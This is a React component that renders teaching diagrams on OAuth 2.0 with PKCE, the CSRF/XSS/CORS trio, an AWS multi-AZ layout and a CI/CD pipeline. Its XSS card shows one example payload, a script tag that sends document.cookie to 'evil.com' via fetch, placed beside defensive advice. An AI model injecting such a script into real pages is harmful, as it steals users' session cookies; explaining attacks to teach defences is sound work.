import { useState } from 'react';
import {
  KeyRound,
  Shield,
  Cloud,
  Activity,
  Key,
  ShieldCheck,
  ShieldAlert,
  Zap,
  Boxes,
  Lock,
  ArrowRight,
  ChevronDown,
  ChevronUp
} from 'lucide-react';

export function SecurityCloudVisuals() {
  const [activeTab, setActiveTab] = useState<'oauth' | 'security-triad' | 'aws' | 'cicd'>('oauth');
  const [expandedSection, setExpandedSection] = useState<string | null>(null);

  const toggleSection = (id: string) => {
    setExpandedSection(prev => (prev === id ? null : id));
  };

  return (
    <div className="space-y-10">
      {/* 1. OAuth 2.0 & PKCE Flow */}
      <section id="oauth-pkce" className="scroll-mt-6">
        <div className="bg-white rounded-2xl border border-slate-200 shadow-sm overflow-hidden">
          <div className="p-6 border-b border-slate-100 bg-slate-50/50 flex flex-col md:flex-row md:items-center justify-between gap-4">
            <div>
              <div className="flex items-center gap-2.5">
                <div className="p-2 bg-sky-100 text-sky-700 rounded-xl">
                  <KeyRound className="w-5 h-5" />
                </div>
                <div>
                  <h2 className="text-xl font-bold text-slate-900">OAuth 2.0 Auth Code Flow with PKCE &amp; Okta IdP</h2>
                  <p className="text-xs text-slate-500 mt-0.5">Authorization Code Grant with Proof Key for Code Exchange (RFC 7636) &amp; Stateless JWT Verification</p>
                </div>
              </div>
            </div>
            <span className="text-xs font-mono bg-sky-100 text-sky-900 px-3 py-1 rounded-full font-bold self-start md:self-auto">
              RFC 7636 Standard
            </span>
          </div>

          <div className="p-6">
            <div className="bg-slate-50 border border-slate-200 rounded-xl p-6 max-w-4xl mx-auto overflow-x-auto mb-6">
              <div className="min-w-[760px] space-y-6">
                
                {/* Actors Header */}
                <div className="grid grid-cols-4 gap-4 text-center">
                  <div className="bg-white border-2 border-slate-300 p-2.5 rounded-xl shadow-xs">
                    <div className="font-bold text-xs text-slate-800">User / Browser</div>
                    <div className="text-[9px] text-slate-500">Resource Owner</div>
                  </div>
                  <div className="bg-sky-50 border-2 border-sky-300 p-2.5 rounded-xl shadow-xs">
                    <div className="font-bold text-xs text-sky-900">SPA Frontend (React)</div>
                    <div className="text-[9px] text-sky-600">Public OAuth Client</div>
                  </div>
                  <div className="bg-purple-50 border-2 border-purple-300 p-2.5 rounded-xl shadow-xs">
                    <div className="font-bold text-xs text-purple-900">Okta / Keycloak</div>
                    <div className="text-[9px] text-purple-600">Authorization Server</div>
                  </div>
                  <div className="bg-emerald-50 border-2 border-emerald-300 p-2.5 rounded-xl shadow-xs">
                    <div className="font-bold text-xs text-emerald-900">Spring Boot API</div>
                    <div className="text-[9px] text-emerald-600">Resource Server</div>
                  </div>
                </div>

                {/* Sequence Steps */}
                <div className="space-y-3 text-xs">
                  {/* Step 1 */}
                  <div className="bg-white p-3 rounded-lg border border-slate-200 flex items-center justify-between shadow-xs">
                    <div className="flex items-center gap-3">
                      <span className="w-5 h-5 bg-sky-100 text-sky-800 rounded-full font-bold flex items-center justify-center text-[10px]">1</span>
                      <span className="font-semibold text-slate-800">Generate PKCE Pair</span>
                    </div>
                    <span className="text-slate-600 text-[11px] font-mono">code_verifier + code_challenge = SHA256(verifier)</span>
                  </div>

                  {/* Step 2 */}
                  <div className="bg-white p-3 rounded-lg border border-slate-200 flex items-center justify-between shadow-xs">
                    <div className="flex items-center gap-3">
                      <span className="w-5 h-5 bg-purple-100 text-purple-800 rounded-full font-bold flex items-center justify-center text-[10px]">2</span>
                      <span className="font-semibold text-slate-800">Redirect to Okta Login</span>
                    </div>
                    <span className="text-slate-600 text-[11px] font-mono">GET /oauth2/v1/authorize?code_challenge=...&amp;response_type=code</span>
                  </div>

                  {/* Step 3 */}
                  <div className="bg-white p-3 rounded-lg border border-slate-200 flex items-center justify-between shadow-xs">
                    <div className="flex items-center gap-3">
                      <span className="w-5 h-5 bg-purple-100 text-purple-800 rounded-full font-bold flex items-center justify-center text-[10px]">3</span>
                      <span className="font-semibold text-slate-800">Okta Issues Auth Code</span>
                    </div>
                    <span className="text-slate-600 text-[11px] font-mono">Redirects to SPA with ?code=auth_code_xyz</span>
                  </div>

                  {/* Step 4 */}
                  <div className="bg-white p-3 rounded-lg border border-slate-200 flex items-center justify-between shadow-xs">
                    <div className="flex items-center gap-3">
                      <span className="w-5 h-5 bg-purple-100 text-purple-800 rounded-full font-bold flex items-center justify-center text-[10px]">4</span>
                      <span className="font-semibold text-slate-800">Exchange Code + Verifier</span>
                    </div>
                    <span className="text-slate-600 text-[11px] font-mono">POST /token (code + plain code_verifier) &rarr; Okta returns JWT Access Token</span>
                  </div>

                  {/* Step 5 */}
                  <div className="bg-white p-3 rounded-lg border border-emerald-200 flex items-center justify-between shadow-xs bg-emerald-50/50">
                    <div className="flex items-center gap-3">
                      <span className="w-5 h-5 bg-emerald-100 text-emerald-800 rounded-full font-bold flex items-center justify-center text-[10px]">5</span>
                      <span className="font-semibold text-slate-800">Access API with Bearer JWT</span>
                    </div>
                    <span className="text-emerald-700 text-[11px] font-mono">Authorization: Bearer &lt;JWT&gt;</span>
                  </div>

                  {/* Step 6 */}
                  <div className="bg-white p-3 rounded-lg border border-emerald-200 flex items-center justify-between shadow-xs bg-emerald-50/50">
                    <div className="flex items-center gap-3">
                      <span className="w-5 h-5 bg-emerald-100 text-emerald-800 rounded-full font-bold flex items-center justify-center text-[10px]">6</span>
                      <span className="font-semibold text-slate-800">Spring Security JWT Validation</span>
                    </div>
                    <span className="text-emerald-700 text-[11px]">Validates RS256 Signature via cached JWKS + Checks exp &amp; scopes</span>
                  </div>
                </div>

              </div>
            </div>

            {/* JWT Structure */}
            <div className="border border-slate-200 rounded-xl p-4 bg-slate-50">
              <div className="text-xs font-bold text-slate-800 mb-2 flex items-center gap-1.5">
                <Key className="w-4 h-4 text-amber-600" /> Anatomical Structure of a JSON Web Token (JWT)
              </div>
              <div className="grid grid-cols-1 md:grid-cols-3 gap-3 text-xs">
                <div className="bg-rose-50 border border-rose-200 p-2.5 rounded-lg">
                  <div className="font-bold text-rose-800 font-mono text-[11px]">1. Header (Base64Url)</div>
                  <div className="text-[10px] text-rose-700 mt-1 font-mono">{`{"alg": "RS256", "kid": "okta-key-1"}`}</div>
                </div>
                <div className="bg-purple-50 border border-purple-200 p-2.5 rounded-lg">
                  <div className="font-bold text-purple-800 font-mono text-[11px]">2. Payload (Claims)</div>
                  <div className="text-[10px] text-purple-700 mt-1 font-mono">{`{"sub": "usr_99", "roles": ["ADMIN"], "exp": 172000}`}</div>
                </div>
                <div className="bg-sky-50 border border-sky-200 p-2.5 rounded-lg">
                  <div className="font-bold text-sky-800 font-mono text-[11px]">3. Signature</div>
                  <div className="text-[10px] text-sky-700 mt-1 font-mono">RSASHA256(header.payload, privateKey)</div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* 2. Web Security Triad: CSRF vs XSS vs CORS */}
      <section id="security-triad" className="scroll-mt-6">
        <div className="bg-white rounded-2xl border border-slate-200 shadow-sm overflow-hidden">
          <div className="p-6 border-b border-slate-100 bg-slate-50/50">
            <div className="flex items-center gap-2.5">
              <div className="p-2 bg-violet-100 text-violet-700 rounded-xl">
                <Shield className="w-5 h-5" />
              </div>
              <div>
                <h2 className="text-xl font-bold text-slate-900">Web Security Triad: CSRF vs XSS vs CORS</h2>
                <p className="text-xs text-slate-500 mt-0.5">Browser Execution Models, Attack Vectors &amp; Spring Boot Defense Strategies</p>
              </div>
            </div>
          </div>

          <div className="p-6">
            <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
              
              {/* CSRF Card */}
              <div className="bg-rose-50/50 border-2 border-rose-200 rounded-2xl p-5 flex flex-col justify-between shadow-xs">
                <div>
                  <div className="flex items-center justify-between mb-3">
                    <span className="font-bold text-rose-900 text-base">CSRF</span>
                    <span className="text-[10px] bg-rose-200 text-rose-800 font-bold px-2 py-0.5 rounded-full">Request Forgery</span>
                  </div>
                  <h4 className="text-xs font-bold text-slate-700 mb-2">Cross-Site Request Forgery</h4>
                  <p className="text-[11px] text-slate-600 mb-4 leading-relaxed">
                    Attacker tricks authenticated browser into submitting unauthorized POST/PUT requests using the victim&apos;s auto-attached session cookies.
                  </p>
                  
                  <div className="bg-white border border-rose-200 rounded-lg p-2.5 mb-3 text-[10px] space-y-1">
                    <div className="font-bold text-rose-800">Attack Vector:</div>
                    <div className="text-slate-600 font-mono">&lt;form action=&quot;bank.com/transfer&quot;&gt;</div>
                  </div>
                </div>

                <div className="border-t border-rose-200 pt-3">
                  <div className="text-[11px] font-bold text-rose-900 mb-1.5 flex items-center gap-1">
                    <ShieldCheck className="w-3.5 h-3.5 text-emerald-600" /> Enterprise Defenses:
                  </div>
                  <ul className="text-[10px] text-slate-700 space-y-1 list-disc pl-4">
                    <li><code>SameSite=Strict/Lax</code> cookies</li>
                    <li>Synchronizer CSRF Token header (<code>X-XSRF-TOKEN</code>)</li>
                    <li>Stateless Bearer JWT APIs (immune)</li>
                  </ul>
                </div>
              </div>

              {/* XSS Card */}
              <div className="bg-amber-50/50 border-2 border-amber-200 rounded-2xl p-5 flex flex-col justify-between shadow-xs">
                <div>
                  <div className="flex items-center justify-between mb-3">
                    <span className="font-bold text-amber-900 text-base">XSS</span>
                    <span className="text-[10px] bg-amber-200 text-amber-800 font-bold px-2 py-0.5 rounded-full">Code Injection</span>
                  </div>
                  <h4 className="text-xs font-bold text-slate-700 mb-2">Cross-Site Scripting</h4>
                  <p className="text-[11px] text-slate-600 mb-4 leading-relaxed">
                    Attacker injects malicious JavaScript (Stored, Reflected, or DOM) that executes within the victim&apos;s browser origin to steal cookies or manipulate the DOM.
                  </p>
                  
                  <div className="bg-white border border-amber-200 rounded-lg p-2.5 mb-3 text-[10px] space-y-1">
                    <div className="font-bold text-amber-800">Attack Vector:</div>
                    <div className="text-slate-600 font-mono">&lt;script&gt;fetch(&quot;evil.com/&quot;+document.cookie)&lt;/script&gt;</div>
                  </div>
                </div>

                <div className="border-t border-amber-200 pt-3">
                  <div className="text-[11px] font-bold text-amber-900 mb-1.5 flex items-center gap-1">
                    <ShieldCheck className="w-3.5 h-3.5 text-emerald-600" /> Enterprise Defenses:
                  </div>
                  <ul className="text-[10px] text-slate-700 space-y-1 list-disc pl-4">
                    <li><code>HttpOnly</code> cookie flag (blocks JS access)</li>
                    <li>Content Security Policy (CSP headers)</li>
                    <li>Context-aware encoding &amp; Jsoup sanitization</li>
                  </ul>
                </div>
              </div>

              {/* CORS Card */}
              <div className="bg-sky-50/50 border-2 border-sky-200 rounded-2xl p-5 flex flex-col justify-between shadow-xs">
                <div>
                  <div className="flex items-center justify-between mb-3">
                    <span className="font-bold text-sky-900 text-base">CORS</span>
                    <span className="text-[10px] bg-sky-200 text-sky-800 font-bold px-2 py-0.5 rounded-full">Browser SOP Policy</span>
                  </div>
                  <h4 className="text-xs font-bold text-slate-700 mb-2">Cross-Origin Resource Sharing</h4>
                  <p className="text-[11px] text-slate-600 mb-4 leading-relaxed">
                    Browser security mechanism that blocks JavaScript on Origin A from reading responses from Origin B unless server explicitly grants permission via HTTP headers.
                  </p>
                  
                  <div className="bg-white border border-sky-200 rounded-lg p-2.5 mb-3 text-[10px] space-y-1">
                    <div className="font-bold text-sky-800">Preflight Trigger:</div>
                    <div className="text-slate-600 font-mono">OPTIONS + Content-Type: application/json</div>
                  </div>
                </div>

                <div className="border-t border-sky-200 pt-3">
                  <div className="text-[11px] font-bold text-sky-900 mb-1.5 flex items-center gap-1">
                    <ShieldCheck className="w-3.5 h-3.5 text-emerald-600" /> Spring Boot Config:
                  </div>
                  <ul className="text-[10px] text-slate-700 space-y-1 list-disc pl-4">
                    <li><code>CorsConfigurationSource</code> Bean</li>
                    <li>Explicit allowed origins (No <code>*</code> with credentials)</li>
                    <li>Exposed response headers (<code>X-Total-Count</code>)</li>
                  </ul>
                </div>
              </div>

            </div>
          </div>
        </div>
      </section>

      {/* 3. AWS Enterprise Cloud Topology */}
      <section id="aws-cloud" className="scroll-mt-6">
        <div className="bg-white rounded-2xl border border-slate-200 shadow-sm overflow-hidden">
          <div className="p-6 border-b border-slate-100 bg-slate-50/50">
            <div className="flex items-center gap-2.5">
              <div className="p-2 bg-amber-100 text-amber-700 rounded-xl">
                <Cloud className="w-5 h-5" />
              </div>
              <div>
                <h2 className="text-xl font-bold text-slate-900">AWS Enterprise Cloud Architecture (VPC &amp; Multi-AZ)</h2>
                <p className="text-xs text-slate-500 mt-0.5">Route 53 &rarr; CloudFront (Edge) &rarr; ALB &rarr; ECS Fargate / EKS &rarr; Aurora Multi-AZ &amp; Redis ElastiCache</p>
              </div>
            </div>
          </div>

          <div className="p-6">
            <div className="bg-slate-50 border border-slate-200 rounded-2xl p-6 max-w-4xl mx-auto">
              {/* Edge Layer */}
              <div className="flex flex-wrap justify-center items-center gap-3 mb-6">
                <div className="bg-white border border-slate-300 px-3 py-2 rounded-lg shadow-xs text-center text-xs font-bold">
                  Client Browser
                </div>
                <span className="text-slate-400 font-mono text-xs">&rarr; HTTPS &rarr;</span>
                <div className="bg-sky-50 border border-sky-300 px-3 py-2 rounded-lg shadow-xs text-center">
                  <div className="text-xs font-bold text-sky-900">Route 53</div>
                  <div className="text-[9px] text-sky-600">Latency DNS</div>
                </div>
                <span className="text-slate-400 font-mono text-xs">&rarr;</span>
                <div className="bg-sky-50 border border-sky-300 px-3 py-2 rounded-lg shadow-xs text-center">
                  <div className="text-xs font-bold text-sky-900">CloudFront + WAF</div>
                  <div className="text-[9px] text-sky-600">Edge Caching &amp; DDoS Protection</div>
                </div>
              </div>

              {/* VPC Boundary */}
              <div className="border-2 border-dashed border-sky-300 rounded-xl p-4 bg-white mb-6">
                <div className="text-xs font-bold text-sky-900 bg-sky-100 px-2 py-0.5 rounded inline-block mb-3">
                  AWS Virtual Private Cloud (VPC) - Private &amp; Public Subnets
                </div>

                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  {/* Compute Tier */}
                  <div className="bg-fuchsia-50 border border-fuchsia-200 rounded-xl p-3">
                    <div className="font-bold text-fuchsia-950 text-xs mb-1">Compute Tier (Private Subnet)</div>
                    <div className="text-[11px] text-slate-600 mb-2">Application Load Balancer (ALB) routes traffic across AZs:</div>
                    <div className="flex gap-2">
                      <div className="bg-white border border-fuchsia-300 p-2 rounded text-center flex-1">
                        <div className="font-bold text-[10px] text-fuchsia-900">AZ-1a</div>
                        <div className="text-[9px] text-slate-500">ECS Task #1</div>
                      </div>
                      <div className="bg-white border border-fuchsia-300 p-2 rounded text-center flex-1">
                        <div className="font-bold text-fuchsia-900 text-[10px]">AZ-1b</div>
                        <div className="text-[9px] text-slate-500">ECS Task #2</div>
                      </div>
                    </div>
                  </div>

                  {/* Data Tier */}
                  <div className="bg-emerald-50 border border-emerald-200 rounded-xl p-3">
                    <div className="font-bold text-emerald-950 text-xs mb-1">Data Tier (Multi-AZ)</div>
                    <div className="text-[11px] text-slate-600 mb-2">Aurora PostgreSQL + ElastiCache Redis:</div>
                    <div className="flex gap-2">
                      <div className="bg-white border border-emerald-300 p-2 rounded text-center flex-1">
                        <div className="font-bold text-[10px] text-emerald-900">Aurora Primary</div>
                        <div className="text-[9px] text-slate-500">Read / Write</div>
                      </div>
                      <div className="bg-white border border-emerald-300 p-2 rounded text-center flex-1">
                        <div className="font-bold text-emerald-900 text-[10px]">Aurora Replica</div>
                        <div className="text-[9px] text-slate-500">Auto-Failover</div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* 4. CI/CD & GitOps Pipeline */}
      <section id="cicd-gitops" className="scroll-mt-6">
        <div className="bg-white rounded-2xl border border-slate-200 shadow-sm overflow-hidden">
          <div className="p-6 border-b border-slate-100 bg-slate-50/50">
            <div className="flex items-center gap-2.5">
              <div className="p-2 bg-rose-100 text-rose-700 rounded-xl">
                <Activity className="w-5 h-5" />
              </div>
              <div>
                <h2 className="text-xl font-bold text-slate-900">Enterprise CI/CD &amp; GitOps Pipeline (ArgoCD &amp; K8s)</h2>
                <p className="text-xs text-slate-500 mt-0.5">Automated Quality Gates, Container Security Scanning (Trivy), and Zero-Downtime Rolling Deployment</p>
              </div>
            </div>
          </div>

          <div className="p-6 overflow-x-auto">
            <div className="min-w-[800px] flex items-center justify-between gap-2 pb-2">
              
              {/* 1. Git */}
              <div className="bg-slate-100 border-2 border-slate-300 p-3 rounded-xl text-center w-36 shadow-xs">
                <div className="font-bold text-slate-900 text-xs">1. Git Push</div>
                <div className="text-[9px] text-slate-500 mt-0.5">main branch PR</div>
              </div>

              <ArrowRight className="w-4 h-4 text-slate-400 shrink-0" />

              {/* 2. CI Quality Gate */}
              <div className="bg-rose-50 border-2 border-rose-300 p-3 rounded-xl text-center w-48 shadow-xs">
                <div className="font-bold text-rose-950 text-xs">2. CI &amp; Quality Gate</div>
                <div className="text-[9px] text-rose-800 mt-0.5">mvn test + SonarQube + Trivy Vulnerability Scan</div>
              </div>

              <ArrowRight className="w-4 h-4 text-slate-400 shrink-0" />

              {/* 3. Docker Registry */}
              <div className="bg-sky-50 border-2 border-sky-300 p-3 rounded-xl text-center w-36 shadow-xs">
                <div className="font-bold text-sky-950 text-xs">3. Image Registry</div>
                <div className="text-[9px] text-sky-700 mt-0.5">ECR / Harbor: sha-a1b2c</div>
              </div>

              <ArrowRight className="w-4 h-4 text-slate-400 shrink-0" />

              {/* 4. ArgoCD GitOps */}
              <div className="bg-purple-50 border-2 border-purple-300 p-3 rounded-xl text-center w-40 shadow-xs">
                <div className="font-bold text-purple-950 text-xs">4. ArgoCD GitOps</div>
                <div className="text-[9px] text-purple-700 mt-0.5">Reconciles K8s manifests</div>
              </div>

              <ArrowRight className="w-4 h-4 text-slate-400 shrink-0" />

              {/* 5. Production K8s */}
              <div className="bg-emerald-50 border-2 border-emerald-300 p-3 rounded-xl text-center w-44 shadow-xs">
                <div className="font-bold text-emerald-950 text-xs">5. Kubernetes Deploy</div>
                <div className="text-[9px] text-emerald-800 mt-0.5">Rolling Update (Zero Downtime)</div>
              </div>

            </div>
          </div>
        </div>
      </section>
    </div>
  );
}
